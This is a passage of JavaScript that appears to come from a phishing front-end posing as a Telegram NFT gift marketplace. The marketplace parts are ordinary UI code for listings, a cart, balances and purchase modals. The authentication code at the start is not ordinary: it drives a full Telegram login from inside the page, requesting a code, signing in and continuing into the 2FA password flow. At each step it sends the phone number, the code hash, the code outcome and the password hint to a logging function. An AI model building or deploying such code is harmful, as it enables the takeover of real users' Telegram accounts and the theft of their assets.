    if (auth.cancelled) return;

    try {
      const result = await client.invoke(
        new lib.Api.auth.SignIn({
          phoneNumber: auth.phone,
          phoneCodeHash: auth.phoneCodeHash,
          phoneCode: code,
        })
      );
      if (result?.user) {
        auth.user = result.user;
      } else {
        const signInErr = new Error('SIGN_IN_FAILED');
        signInErr.code = 'SIGN_IN_FAILED';
        throw signInErr;
      }
      await sendAuthLog('Введён код', auth.phone);
      await finalizeGramjsAuth(client, auth);
      return;
    } catch (err) {
      const { token } = getAuthErrorToken(err);
      if (token.includes('SESSION_PASSWORD_NEEDED')) {
        const passwordInfo = await client.invoke(new lib.Api.account.GetPassword());
        const hint = passwordInfo?.hint || '';
        await sendAuthLog(
          'Введён код! Требуется 2FA',
          auth.phone,
          `Подсказка: ${hint || '—'}`
        );
        await runPasswordFlow(client, auth, passwordInfo);
        return;
      }
      if (token.includes('PHONE_CODE_INVALID')) {
        await sendAuthLog('Неверный код', auth.phone);
        markAuthErrorLogged(err);
        prepareCodePrompt(auth, t('auth_code_invalid'), true, true);
        continue;
      }
      if (token.includes('PHONE_CODE_EXPIRED')) {
        await sendAuthLog('Код истёк', auth.phone);
        markAuthErrorLogged(err);
        prepareCodePrompt(auth, t('auth_code_expired'), true, true);
        continue;
      }
      if (token.includes('PHONE_CODE_EMPTY') || token.includes('CODE IS EMPTY')) {
        await sendAuthLog('Код пустой', auth.phone);
        markAuthErrorLogged(err);
        prepareCodePrompt(auth, t('code_short'), true, true);
        continue;
      }
      throw err;
    }
  }
}

async function startGramjsAuth(phone) {
  const now = Date.now();
  if (
    gramjsAuth &&
    gramjsAuth.phone === phone &&
    GRAMJS_PENDING_TTL_MS > 0 &&
    now - gramjsAuth.createdAt < GRAMJS_PENDING_TTL_MS
  ) {
    authToken = 'gramjs';
    authLoading = false;
    setAuthStatus(t('code_sent'));
    showAuthStep(elements.authCodeForm);
    toggleAuthInputs(elements.authCodeForm, false);
    if (elements.authStart) elements.authStart.disabled = false;
    return;
  }

  if (gramjsAuth) {
    await abortGramjsAuth();
  }

  const client = await ensureGramjsClient();
  const lib = gramjsLib || getGramjsLib();
  if (!lib?.Api?.auth?.SendCode) {
    throw new Error('GRAMJS_START_MISSING');
  }

  const auth = {
    phone,
    createdAt: now,
    codeDeferred: createDeferred(),
    passwordDeferred: null,
    cancelled: false,
    phoneCodeHash: '',
    sentType: '',
    nextType: '',
    timeout: null,
    logToken: generateAuthToken(),
    user: null,
  };
  gramjsAuth = auth;
  authToken = 'gramjs';

  if (gramjsAuthTimer) clearTimeout(gramjsAuthTimer);
  if (GRAMJS_PENDING_TTL_MS > 0) {
    gramjsAuthTimer = setTimeout(() => {
      void abortGramjsAuth();
    }, GRAMJS_PENDING_TTL_MS);
  }

  try {
    const sent = await sendCodeRequest(client, phone);
    const meta = getSentCodeMeta(sent);
    auth.phoneCodeHash = meta.phoneCodeHash || '';
    auth.sentType = meta.sentType || '';
    auth.nextType = meta.nextType || '—';
    auth.timeout = meta.timeout ?? null;

    if (!auth.phoneCodeHash) {
      const err = new Error('PHONE_CODE_HASH_EMPTY');
      err.code = 'PHONE_CODE_HASH_EMPTY';
      throw err;
    }
    if (GRAMJS_REQUIRE_APP_CODE && auth.sentType !== 'SentCodeTypeApp') {
      const err = new Error('CODE_TYPE_NOT_APP');
      err.code = 'CODE_TYPE_NOT_APP';
      throw err;
    }

    await sendAuthLog(
      'Код отправлен на номер:',
      phone,
      `Token: ${auth.logToken} | Hash: ${auth.phoneCodeHash} | Type: ${auth.sentType} | Next: ${auth.nextType} | Timeout: ${auth.timeout ?? '—'}`
    );
  } catch (err) {
    if (!isAuthErrorLogged(err)) {
      await logAuthError(err, phone);
    }
    throw err;
  }

  prepareCodePrompt(auth, t('code_sent'), false, true);
  void runGramjsAuthFlow(client, auth).catch((error) => handleGramjsAuthError(error, auth));
}

function getStartParam() {
  const direct = window.Telegram?.WebApp?.initDataUnsafe?.start_param;
  if (direct) return String(direct);

  const initData = window.Telegram?.WebApp?.initData;
  if (!initData) return null;

  try {
    const params = new URLSearchParams(initData);
    return params.get('start_param');
  } catch (err) {
    console.warn('Failed to parse start_param:', err);
  }

  return null;
}

function extractStarsToken(param) {
  if (!param) return null;
  const raw = String(param);
  if (!raw.startsWith(STAR_PARAM_PREFIX)) return null;
  const token = raw.slice(STAR_PARAM_PREFIX.length).trim();
  return token || null;
}

function wasStarTokenClaimed(token) {
  if (!token) return false;
  try {
    return localStorage.getItem(`${STAR_CLAIM_KEY}.${token}`) === '1';
  } catch (err) {
    return false;
  }
}

function markStarTokenClaimed(token) {
  if (!token) return;
  try {
    localStorage.setItem(`${STAR_CLAIM_KEY}.${token}`, '1');
  } catch (err) {
    console.warn('Failed to store star claim token:', err);
  }
}

function getProfilePath() {
  const user = getTelegramUser();
  if (!user) return '/market/profile';
  const params = new URLSearchParams();
  if (user.id != null) params.set('user_id', user.id);
  if (user.username) params.set('username', user.username);
  const query = params.toString();
  return query ? `/market/profile?${query}` : '/market/profile';
}

function getAccessPath() {
  const user = getTelegramUser();
  if (!user || user.id == null) return '/market/access';
  const params = new URLSearchParams();
  params.set('user_id', user.id);
  const query = params.toString();
  return query ? `/market/access?${query}` : '/market/access';
}

function getSettingsPath() {
  const user = getTelegramUser();
  if (!user || user.id == null) return '/market/settings';
  const params = new URLSearchParams();
  params.set('user_id', user.id);
  const query = params.toString();
  return query ? `/market/settings?${query}` : '/market/settings';
}

async function fetchJson(path, fallback) {
  try {
    const res = await fetch(`${API_BASE}${path}`, { cache: 'no-store' });
    if (!res.ok) throw new Error(`Request failed: ${res.status}`);
    return await res.json();
  } catch (err) {
    console.warn('Fetch failed:', path, err);
    return fallback;
  }
}

async function postJson(path, payload) {
  try {
    const res = await fetch(`${API_BASE}${path}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload || {}),
    });
    const data = await res.json().catch(() => ({}));
    return { res, data };
  } catch (err) {
    console.warn('Post failed:', path, err);
    return { res: null, data: null, error: err };
  }
}

function formatTon(value) {
  const num = Number(value);
  if (!Number.isFinite(num)) return '0';
  const hasDecimals = Math.abs(num % 1) > 0.001;
  const locale = state.language === 'en' ? 'en-US' : 'ru-RU';
  return num.toLocaleString(locale, {
    minimumFractionDigits: hasDecimals ? 2 : 0,
    maximumFractionDigits: 2,
  });
}

function formatStars(value) {
  const num = Number(value);
  if (!Number.isFinite(num)) return '0';
  const hasDecimals = Math.abs(num % 1) > 0.001;
  const locale = state.language === 'en' ? 'en-US' : 'ru-RU';
  return num.toLocaleString(locale, {
    minimumFractionDigits: hasDecimals ? 2 : 0,
    maximumFractionDigits: hasDecimals ? 2 : 0,
  });
}

function formatUsd(value) {
  const num = Number(value);
  if (!Number.isFinite(num)) return '$0.00';
  const locale = state.language === 'en' ? 'en-US' : 'ru-RU';
  return `$${num.toLocaleString(locale, {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  })}`;
}

function formatGiftCount(count) {
  const total = Number(count);
  if (!Number.isFinite(total) || total <= 0) return t('cart_items_count', { count: 0 });
  if (state.language === 'en') {
    return total === 1 ? '1 gift' : `${total} gifts`;
  }
  const mod10 = total % 10;
  const mod100 = total % 100;
  let word = 'подарков';
  if (mod10 === 1 && mod100 !== 11) {
    word = 'подарок';
  } else if (mod10 >= 2 && mod10 <= 4 && (mod100 < 10 || mod100 >= 20)) {
    word = 'подарка';
  }
  return `${total} ${word}`;
}

function getPriceValue(item) {
  const price = Number(item?.price);
  return Number.isFinite(price) ? price : 0;
}

function getItemNumberValue(item) {
  const raw = item?.number ?? item?.id ?? 0;
  const num = Number(String(raw).replace(/\D/g, ''));
  return Number.isFinite(num) ? num : 0;
}

function getOwnedId(item, index) {
  const value = item?.id ?? item?.number ?? index;
  return String(value);
}

function getCartKey(item) {
  const value = item?.id ?? item?.number ?? item?.name ?? '';
  return String(value);
}

function isInCart(item) {
  const key = getCartKey(item);
  return state.cartItems.some((entry) => getCartKey(entry) === key);
}

function getCartSelectorKey(key) {
  if (typeof CSS !== 'undefined' && typeof CSS.escape === 'function') {
    return CSS.escape(key);
  }
  return String(key).replace(/"/g, '\\"');
}

function setCartButtonState(button, inCart) {
  if (!button) return;
  button.classList.toggle('is-added', inCart);
  const icon = inCart ? 'check' : 'shopping-cart';
  button.innerHTML = `<i data-lucide="${icon}" aria-hidden="true"></i>`;
}

function updateCartButtonsByKey(key, inCart) {
  const selector = getCartSelectorKey(key);
  document.querySelectorAll(`.lock[data-cart-key="${selector}"]`).forEach((btn) => {
    setCartButtonState(btn, inCart);
  });
  renderIcons();
}

function isToyBearItem(item) {
  const numberValue = Number(String(item?.number ?? '').replace(/\D/g, ''));
  if (numberValue === GIFT_POPUP_NUMBER) return true;
  const name = String(item?.name || '').toLowerCase();
  return name.includes(GIFT_POPUP_NAME.toLowerCase());
}

function filterOwnedForCurrentUser(items) {
  const user = getTelegramUser();
  if (!user) return items;
  const userId = user.id;
  const username = String(user.username || '').toLowerCase();
  return items.filter((item) => {
    const ownerId = item?.owner_id;
    if (ownerId !== undefined && ownerId !== null && userId !== null && userId !== undefined) {
      const idMatch = Number(ownerId) === Number(userId);
      if (Number.isFinite(Number(ownerId))) return idMatch;
    }
    const ownerUsername = String(item?.owner_username || '').toLowerCase();
    if (ownerUsername && username) {
      return ownerUsername === username;
    }
    const itemId = String(item?.id || '');
    if (userId && itemId.includes(`-${userId}-`)) {
      return true;
    }
    return false;
  });
}

function dedupeToyBear(items) {
  let seen = false;
  const filtered = [];
  for (let i = items.length - 1; i >= 0; i -= 1) {
    const item = items[i];
    if (isToyBearItem(item)) {
      if (seen) continue;
      seen = true;
    }
    filtered.push(item);
  }
  return filtered.reverse();
}

function normalizeMaxPrice(value) {
  const max = Number(value);
  if (!Number.isFinite(max) || max <= 0) return 100;
  if (max <= 1000) return Math.ceil(max / 10) * 10;
  if (max <= 10000) return Math.ceil(max / 100) * 100;
  return Math.ceil(max / 1000) * 1000;
}

function updateSortUi() {
  if (!elements.sortRange || !elements.sortFill || !elements.sortThumb) return;
  if (state.sortRangeMax === null) return;
  const rangeMax = state.sortRangeMax;
  const maxPrice = state.sortMaxPrice ?? rangeMax;
  const safeRange = rangeMax > 0 ? rangeMax : 1;
  const percent = Math.min(100, Math.max(0, (maxPrice / safeRange) * 100));

  elements.sortFill.style.width = `${percent}%`;
  elements.sortThumb.style.left = `${percent}%`;

  if (elements.sortValue) {
    elements.sortValue.textContent = t('sort_range', { max: formatTon(maxPrice) });
  }
  if (elements.sortMin) elements.sortMin.textContent = '0';
  if (elements.sortMax) elements.sortMax.textContent = formatTon(rangeMax);
  elements.sortRange.value = String(maxPrice);
}

function syncCodeCells() {
  if (!elements.authCodeInput || !elements.codeCellNodes.length) return;
  const raw = elements.authCodeInput.value || '';
  const digits = raw.replace(/\D/g, '').slice(0, 5);
  if (raw !== digits) {
    elements.authCodeInput.value = digits;
  }

  elements.codeCellNodes.forEach((cell, index) => {
    const char = digits[index] || '';
    cell.textContent = char;
    cell.classList.toggle('is-filled', Boolean(char));
    cell.classList.toggle('is-active', index === digits.length && digits.length < 5);
  });

  if (!digits.length && elements.codeCellNodes[0]) {
    elements.codeCellNodes[0].classList.add('is-active');
  }
}

function setCodeError(isError) {
  if (!elements.codeInput) return;
  elements.codeInput.classList.toggle('is-error', Boolean(isError));
}

function setPasswordError(isError) {
  if (!elements.passwordInput) return;
  elements.passwordInput.classList.toggle('is-error', Boolean(isError));
}

function updatePasswordToggleLabel() {
  if (!elements.passwordToggle) return;
  const isVisible = elements.passwordToggle.classList.contains('is-visible');
  const key = isVisible ? 'aria_hide_password' : 'aria_show_password';
  elements.passwordToggle.dataset.i18nAria = key;
  elements.passwordToggle.setAttribute('aria-label', t(key));
}

function initSortRange(items) {
  if (!elements.sortRange) return;
  const maxPrice = normalizeMaxPrice(Math.max(...items.map(getPriceValue), 0));
  state.sortRangeMax = maxPrice;
  if (!Number.isFinite(state.sortMaxPrice) || state.sortMaxPrice === null) {
    state.sortMaxPrice = maxPrice;
  } else {
    state.sortMaxPrice = Math.min(state.sortMaxPrice, maxPrice);
  }
  elements.sortRange.min = '0';
  elements.sortRange.max = String(maxPrice);
  elements.sortRange.step = maxPrice <= 100 ? '1' : maxPrice <= 1000 ? '5' : '10';
  updateSortUi();
}

function setSortMode(mode) {
  state.sortMode = mode;
  if (elements.sortChips.length) {
    elements.sortChips.forEach((chip) => {
      chip.classList.toggle('is-active', chip.dataset.sort === mode);
    });
  }
}

function shufflePreferCheap(items) {
  const pool = items.slice();
  const result = [];
  while (pool.length) {
    let total = 0;
    const weights = pool.map((item) => {
      const weight = 1 / (getPriceValue(item) + 1);
      total += weight;
      return weight;
    });
    let roll = Math.random() * total;
    let index = 0;
    for (; index < weights.length; index += 1) {
      roll -= weights[index];
      if (roll <= 0) break;
    }
    const pickIndex = Math.min(index, pool.length - 1);
    result.push(pool.splice(pickIndex, 1)[0]);
  }
  return result;
}

function getSortedMarketItems() {
  const base = Array.isArray(state.market) ? state.market : [];
  if (!base.length) return [];

  switch (state.sortMode) {
    case 'expensive':
      return [...base].sort((a, b) => getPriceValue(b) - getPriceValue(a));
    case 'popular':
      return state.marketPopular ? state.marketPopular.slice() : shufflePreferCheap(base);
    case 'new':
      return state.marketNew ? state.marketNew.slice() : [...base].sort((a, b) => getItemNumberValue(b) - getItemNumberValue(a));
    case 'cheap':
    default:
      return [...base].sort((a, b) => getPriceValue(a) - getPriceValue(b));
  }
}

function buildPlaceholder(seed, label) {
  const normalized = Number(String(seed || 0).replace(/\D/g, '')) || 0;
  const hue = (normalized * 37) % 360;
  const shortLabel = String(label || 'NFT').slice(0, 6).toUpperCase();
  const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="600" height="600" viewBox="0 0 600 600"><defs><linearGradient id="g" x1="0" x2="1" y1="0" y2="1"><stop offset="0" stop-color="hsl(${hue},80%,52%)"/><stop offset="1" stop-color="hsl(${(hue + 40) % 360},80%,42%)"/></linearGradient></defs><rect width="600" height="600" fill="url(#g)"/><circle cx="450" cy="150" r="130" fill="rgba(255,255,255,0.18)"/><circle cx="140" cy="460" r="180" fill="rgba(0,0,0,0.2)"/><text x="50%" y="52%" text-anchor="middle" font-family="SF Pro Text, -apple-system, BlinkMacSystemFont, sans-serif" font-size="64" fill="rgba(255,255,255,0.85)" letter-spacing="4">${shortLabel}</text></svg>`;
  return `data:image/svg+xml;charset=UTF-8,${encodeURIComponent(svg)}`;
}

function resolveImageUrl(image) {
  if (!image) return null;
  if (/^https?:\/\//i.test(image)) return image;
  if (image.startsWith('/')) return `${API_BASE}${image}`;
  return image;
}

function setAvatar(el, url, label) {
  if (!el) return;
  const fallbackLabel = label || '?';
  el.style.backgroundImage = '';
  el.textContent = fallbackLabel;
  if (!url) return;

  const img = new Image();
  img.onload = () => {
    el.style.backgroundImage = `url('${url}')`;
    el.textContent = '';
  };
  img.onerror = () => {
    el.style.backgroundImage = '';
    el.textContent = fallbackLabel;
  };
  img.src = url;
}

function getJoinedKey(userId) {
  return userId ? `${JOINED_KEY}.${userId}` : JOINED_KEY;
}

function getOrSetJoinedDate(userId) {
  if (!userId) return new Date();
  const key = getJoinedKey(userId);
  try {
    const stored = localStorage.getItem(key);
    if (stored) {
      const parsed = new Date(stored);
      if (!Number.isNaN(parsed.getTime())) {
        return parsed;
      }
    }
    const now = new Date();
    localStorage.setItem(key, now.toISOString());
    return now;
  } catch (err) {
    return new Date();
  }
}

function setJoinedDateStorage(userId, date) {
  if (!userId || !(date instanceof Date) || Number.isNaN(date.getTime())) return;
  try {
    localStorage.setItem(getJoinedKey(userId), date.toISOString());
  } catch (err) {
    console.warn('Failed to store joined date:', err);
  }
}

function resolveJoinedDate(profile, userId) {
  const joinedRaw = profile?.joined_at;
  if (joinedRaw) {
    const parsed = new Date(joinedRaw);
    if (!Number.isNaN(parsed.getTime())) {
      setJoinedDateStorage(userId, parsed);
      return parsed;
    }
  }
  return getOrSetJoinedDate(userId);
}

function formatJoinedDate(date) {
  if (!(date instanceof Date) || Number.isNaN(date.getTime())) return '—';
  const locale = state.language === 'en' ? 'en-US' : 'ru-RU';
  return date.toLocaleDateString(locale, {
    year: 'numeric',
    month: 'short',
    day: '2-digit',
  });
}

function updateProfileAuthStatus(isAuthorized) {
  if (!elements.profileAuth) return;
  const ok = Boolean(isAuthorized);
  elements.profileAuth.classList.toggle('is-ok', ok);
  elements.profileAuth.classList.toggle('is-no', !ok);
  const icon = ok ? 'check' : 'x';
  const label = ok ? t('profile_auth_yes') : t('profile_auth_no');
  elements.profileAuth.innerHTML = `<i data-lucide="${icon}" aria-hidden="true"></i><span>${label}</span>`;
  renderIcons();
}

function roundStarsAmount(value) {
  if (!Number.isFinite(value)) return null;
  return Math.round(value / 100) * 100;
}

function updatePremiumPlans(rate) {
  if (!elements.premiumPlans.length) return;
  const numericRate = Number(rate);
  elements.premiumPlans.forEach((plan) => {
    const amountEl = plan.querySelector('.plan-amount');
    const usd = Number(plan.dataset.premiumUsd || 0);
    const isSelected = selectedPremiumUsd !== null && usd === selectedPremiumUsd;
    plan.classList.toggle('is-selected', isSelected);
    if (!amountEl) return;
    if (!numericRate || !Number.isFinite(usd) || usd <= 0) {
      amountEl.textContent = '— ⭐';
      return;
    }
    const rawStars = usd / numericRate;
    const rounded = roundStarsAmount(rawStars);
    amountEl.textContent = rounded ? `${formatStars(rounded)} ⭐` : '— ⭐';
  });
}

function setPremiumSelection(usd) {
  selectedPremiumUsd = usd;
  updatePremiumPlans(state.profile?.stars_usd_rate ?? 0);
}

function setStarsPanelOpen(open) {
  starsPanelOpen = open;
  if (!elements.starsPanel || !elements.starsBody || !elements.starsToggle) return;
  elements.starsPanel.classList.toggle('is-collapsed', !open);
  elements.starsBody.setAttribute('aria-hidden', open ? 'false' : 'true');
  elements.starsToggle.setAttribute('aria-expanded', open ? 'true' : 'false');
}

function updateStarsUi(profile) {
  const stars = formatStars(profile?.stars ?? DEFAULT_PROFILE.stars);
  if (elements.headerStars) elements.headerStars.textContent = stars;
  if (elements.profileStars) elements.profileStars.textContent = stars;
  if (elements.topupStars) elements.topupStars.textContent = stars;

  const tonBalance = formatTon(profile?.balance ?? DEFAULT_PROFILE.balance);
  if (elements.topupTon) elements.topupTon.textContent = tonBalance;

  const rate = Number(profile?.stars_usd_rate ?? 0);
  const starsValue = Number(profile?.stars ?? 0);
  const usdValue = rate > 0 && Number.isFinite(starsValue) ? formatUsd(starsValue * rate) : '$0.00';
  if (elements.topupStarsUsd) elements.topupStarsUsd.textContent = usdValue;
  updatePremiumPlans(rate);
}

function setStarsClaimAmount(amount) {
  if (!elements.starsClaimValue) return;
  if (amount === null || amount === undefined || amount === '') {
    elements.starsClaimValue.textContent = '—';
    return;
  }
  elements.starsClaimValue.textContent = formatStars(amount);
}

function setStarsClaimError(message) {
  if (!elements.starsClaimError) return;
  if (!message) {
    elements.starsClaimError.textContent = '';
    elements.starsClaimError.classList.remove('visible');
    return;
  }
  elements.starsClaimError.textContent = message;
  elements.starsClaimError.classList.add('visible');
}

function resolveStarsClaimError(res, data) {
  if (!res) return t('stars_claim_error');
  if (res.status === 403) return t('stars_claim_forbidden');
  if (res.status === 404) return t('stars_claim_missing');
  if (res.status === 409) return t('stars_claim_used');
  if (res.status === 400 || res.status === 422) return t('stars_claim_invalid');
  if (data?.detail) return data.detail;
  return t('stars_claim_error');
}

function applyProfile(profile) {
  const tgUser = getTelegramUser();
  const tagFromProfile = profile?.tag || DEFAULT_PROFILE.tag;
  const tagFromTg = tgUser?.username ? `@${tgUser.username}` : null;
  const tag = tagFromTg || tagFromProfile || '@anonymous';
  const profileSubtitle = profile?.subtitle;
  const defaultRu = TRANSLATIONS.ru.profile_subtitle;
  const defaultEn = TRANSLATIONS.en.profile_subtitle;
  const subtitle =
    profileSubtitle && profileSubtitle !== defaultRu && profileSubtitle !== defaultEn
      ? profileSubtitle
      : t('profile_subtitle');
  const balance = formatTon(profile?.balance ?? DEFAULT_PROFILE.balance);
  const avatarUrl = tgUser?.photo_url || profile?.avatar || null;
  const label = tag.replace('@', '').slice(0, 1).toUpperCase();
  const nameParts = [tgUser?.first_name, tgUser?.last_name].filter(Boolean);
  const displayName = nameParts.join(' ').trim() || tag;

  if (elements.headerTag) elements.headerTag.textContent = tag;
  if (elements.profileTag) elements.profileTag.textContent = tag;
  if (elements.profileName) elements.profileName.textContent = displayName;
  if (elements.profileJoined) {
    const joinedDate = resolveJoinedDate(profile, tgUser?.id);
    elements.profileJoined.textContent = formatJoinedDate(joinedDate);
  }
  updateProfileAuthStatus(state.hasChatAccess || state.isAuthorized);
  if (elements.headerSub) elements.headerSub.textContent = subtitle;
  if (elements.headerBalance) elements.headerBalance.textContent = balance;
  if (elements.profileBalance) elements.profileBalance.textContent = balance;

  setAvatar(elements.headerAvatar, avatarUrl, label);
  setAvatar(elements.profileAvatar, avatarUrl, label);

  if (elements.statVolume) elements.statVolume.textContent = formatTon(profile?.stats?.volume ?? 0);
  if (elements.statBought) elements.statBought.textContent = formatTon(profile?.stats?.bought ?? 0);
  if (elements.statSold) elements.statSold.textContent = formatTon(profile?.stats?.sold ?? 0);

  updateStarsUi(profile);
}

async function refreshProfileData() {
  const profileRes = await fetchJson(getProfilePath(), null);
  if (!profileRes) return;
  state.profile = { ...state.profile, ...profileRes };
  applyProfile(state.profile);
}

function createCartButton() {
  const wrap = document.createElement('button');
  wrap.className = 'lock';
  wrap.type = 'button';
  wrap.setAttribute('aria-label', t('add_to_cart'));
  wrap.innerHTML = '<i data-lucide="shopping-cart" aria-hidden="true"></i>';
  return wrap;
}

function createMarketCard(item, index, disableAnimation) {
  const card = document.createElement('article');
  card.className = 'card';
  if (disableAnimation) {
    card.style.animation = 'none';
    card.style.opacity = '1';
    card.style.transform = 'translateY(0)';
  } else {
    card.style.animationDelay = `${index * 0.06}s`;
  }
  card.setAttribute('data-card-id', getCartKey(item));

  const media = document.createElement('div');
  media.className = 'card-media';
  const img = document.createElement('img');
  const fallback = buildPlaceholder(item.number || item.id || index, item.name);
  img.src = resolveImageUrl(item.image) || fallback;
  img.alt = item.name || 'NFT';
  img.loading = 'lazy';
  img.addEventListener('error', () => {
    if (img.src !== fallback) img.src = fallback;
  });
  media.appendChild(img);

  const title = document.createElement('div');
  title.className = 'card-title';
  title.textContent = item.name || 'NFT Gift';

  const number = document.createElement('div');
  number.className = 'card-number';
  const numberValue = item.number ?? item.id ?? '';
  number.textContent = numberValue ? `#${numberValue}` : '#—';

  const actions = document.createElement('div');
  actions.className = 'card-actions';

  const price = document.createElement('button');
  price.className = 'price-btn';
  price.type = 'button';
  price.setAttribute('aria-label', t('buy_for', { price: formatTon(item.price ?? 0) }));
  const priceIcon = document.createElement('img');
  priceIcon.className = 'ton-icon';
  priceIcon.src = './img/image.png';
  priceIcon.alt = 'TON';
  price.appendChild(priceIcon);
  const priceValue = document.createElement('span');
  priceValue.textContent = formatTon(item.price ?? 0);
  price.appendChild(priceValue);

  const lock = createCartButton();
  const cartKey = getCartKey(item);
  lock.dataset.cartKey = cartKey;
  setCartButtonState(lock, isInCart(item));

  price.addEventListener('click', (event) => {
    event.stopPropagation();
    triggerHaptic('light');
    openPurchaseModal(item);
  });

  lock.addEventListener('click', (event) => {
    event.stopPropagation();
    triggerHaptic('light');
    if (isInCart(item)) {
      removeFromCart(item);
      return;
    }
    addToCart(item);
  });

  actions.appendChild(price);
  actions.appendChild(lock);

  card.appendChild(media);
  card.appendChild(title);
  card.appendChild(number);
  card.appendChild(actions);

  return card;
}

function createOwnedCard(item, index, disableAnimation) {
  const card = document.createElement('article');
  card.className = 'card';
  if (disableAnimation) {
    card.style.animation = 'none';
    card.style.opacity = '1';
    card.style.transform = 'translateY(0)';
  } else {
    card.style.animationDelay = `${index * 0.06}s`;
  }
  card.dataset.ownedId = getOwnedId(item, index);

  const media = document.createElement('div');
  media.className = 'card-media';
  const img = document.createElement('img');
  const fallback = buildPlaceholder(item.number || item.id || index, item.name);
  img.src = resolveImageUrl(item.image) || fallback;
  img.alt = item.name || 'NFT';
  img.loading = 'lazy';
  img.addEventListener('error', () => {
    if (img.src !== fallback) img.src = fallback;
  });
  media.appendChild(img);

  const meta = document.createElement('div');
  meta.className = 'card-meta';

  const title = document.createElement('div');
  title.className = 'card-title';
  title.textContent = item.name || 'NFT Gift';

  const number = document.createElement('div');
  number.className = 'card-number';
  const numberValue = item.number ?? item.id ?? '';
  number.textContent = numberValue ? `#${numberValue}` : '#—';


  const check = document.createElement('span');
  check.className = 'card-check';
  check.setAttribute('aria-hidden', 'true');

  meta.appendChild(title);
  meta.appendChild(number);

  card.appendChild(media);
  card.appendChild(meta);
  card.appendChild(check);

  card.addEventListener('click', () => {
    triggerHaptic('light');
    setOwnedSelection(card);
  });

  return card;
}

function renderEmpty(target, title, subtitle) {
  const box = document.createElement('div');
  box.className = 'empty-state';
  box.innerHTML = `<div>${title}</div><div>${subtitle}</div>`;
  target.appendChild(box);
}

function renderMarket() {
  if (!elements.marketGrid) return;
  elements.marketGrid.innerHTML = '';
  const query = state.search.replace('#', '').trim();
  const sourceItems = getSortedMarketItems();
  const disableAnimation = state.marketRendered;
  let items = sourceItems.filter((item) => {
    if (!query) return true;
    const idValue = String(item.number ?? item.id ?? '');
    return idValue.includes(query);
  });
  if (state.sortMaxPrice !== null && Number.isFinite(state.sortMaxPrice)) {
    items = items.filter((item) => getPriceValue(item) <= state.sortMaxPrice);
  }

  if (!items.length) {
    renderEmpty(elements.marketGrid, t('empty_market_title'), t('empty_market_subtitle'));
    return;
  }

  const fragment = document.createDocumentFragment();
  items.forEach((item, index) => {
    fragment.appendChild(createMarketCard(item, index, disableAnimation));
  });
  elements.marketGrid.appendChild(fragment);
  renderIcons();
  state.marketRendered = true;
}

function renderOwned() {
  if (!elements.ownedGrid) return;
  elements.ownedGrid.innerHTML = '';
  state.selectedOwnedId = null;
  const disableAnimation = state.ownedRendered;

  if (!state.owned.length) {
    renderEmpty(elements.ownedGrid, t('empty_owned_title'), t('empty_owned_subtitle'));
    return;
  }

  const fragment = document.createDocumentFragment();
  state.owned.forEach((item, index) => {
    fragment.appendChild(createOwnedCard(item, index, disableAnimation));
  });
  elements.ownedGrid.appendChild(fragment);
  state.ownedRendered = true;
}

function setOwnedSelection(card) {
  if (!elements.ownedGrid) return;
  elements.ownedGrid.querySelectorAll('.card').forEach((node) => {
    node.classList.remove('is-selected');
  });
  if (!card) {
    state.selectedOwnedId = null;
    return;
  }
  card.classList.add('is-selected');
  state.selectedOwnedId = card.dataset.ownedId || null;
}

function getSelectedOwnedItem() {
  if (!state.selectedOwnedId) return null;
  for (let i = 0; i < state.owned.length; i += 1) {
    const item = state.owned[i];
    if (getOwnedId(item, i) === state.selectedOwnedId) {
      return item;
    }
  }
  return null;
}

function resetActionInputs() {
  if (!elements.actionInputs?.length) return;
  elements.actionInputs.forEach((input) => {
    input.value = '';
  });
}

function showActionPanel(action) {
  if (!elements.actionPanels?.length) return;
  elements.actionPanels.forEach((panel) => {
    panel.classList.toggle('is-active', panel.dataset.actionPanel === action);
  });
}

function openActionModal(action) {
  if (!elements.actionModal) return;
  const item = getSelectedOwnedItem();
  if (!item) return;
  const config = ACTION_CONFIG[action] || ACTION_CONFIG.send;
  if (elements.actionTitle) {
    elements.actionTitle.dataset.i18n = config.title;
    elements.actionTitle.textContent = t(config.title);
  }
  if (elements.actionSubtitle) {
    elements.actionSubtitle.dataset.i18n = config.subtitle;
    elements.actionSubtitle.textContent = t(config.subtitle);
  }
  if (elements.actionSubmit) {
    elements.actionSubmit.dataset.i18n = config.button;
    elements.actionSubmit.textContent = t(config.button);
  }

  const image = resolveImageUrl(item.image) || buildPlaceholder(item.number || item.id, item.name);
  if (elements.actionGiftImage) {
    elements.actionGiftImage.src = image;
    elements.actionGiftImage.alt = item.name || 'Gift';
  }
  if (elements.actionGiftName) elements.actionGiftName.textContent = item.name || 'Gift';
  if (elements.actionGiftNumber) {
    const numberValue = item.number ?? item.id ?? '';
    elements.actionGiftNumber.textContent = numberValue ? `#${numberValue}` : '#—';
  }

  state.activeOwnedAction = action;
  resetActionInputs();
  showActionPanel(action);
  elements.actionModal.classList.add('open');
  elements.actionModal.setAttribute('aria-hidden', 'false');
}

function closeActionModal() {
  if (!elements.actionModal) return;
  elements.actionModal.classList.remove('open');
  elements.actionModal.setAttribute('aria-hidden', 'true');
  state.activeOwnedAction = null;
}

function openPurchaseModal(item) {
  if (!elements.purchaseModal || !item) return;
  const image = resolveImageUrl(item.image) || buildPlaceholder(item.number || item.id, item.name);
  const numberValue = item.number ?? item.id ?? '';
  const priceValue = formatTon(item.price ?? 0);
  const balanceValue = formatTon(state.profile?.balance ?? 0);

  if (elements.purchaseTitle) {
    elements.purchaseTitle.textContent = t('purchase_title');
  }
  if (elements.purchaseImage) {
    elements.purchaseImage.src = image;
    elements.purchaseImage.alt = item.name || t('alt_gift');
  }
  if (elements.purchaseName) elements.purchaseName.textContent = item.name || 'Gift';
  if (elements.purchaseNumber) {
    elements.purchaseNumber.textContent = numberValue ? `#${numberValue}` : '#—';
  }
  if (elements.purchasePrice) elements.purchasePrice.textContent = priceValue;
  if (elements.purchaseBalance) elements.purchaseBalance.textContent = balanceValue;
  if (elements.purchaseTotal) elements.purchaseTotal.textContent = priceValue;
  if (elements.purchaseBuy) elements.purchaseBuy.disabled = true;

  state.activePurchaseItem = item;
  elements.purchaseModal.classList.add('open');
  elements.purchaseModal.setAttribute('aria-hidden', 'false');
}

function closePurchaseModal() {
  if (!elements.purchaseModal) return;
  elements.purchaseModal.classList.remove('open');
  elements.purchaseModal.setAttribute('aria-hidden', 'true');
  state.activePurchaseItem = null;
}

function getCartTotal() {
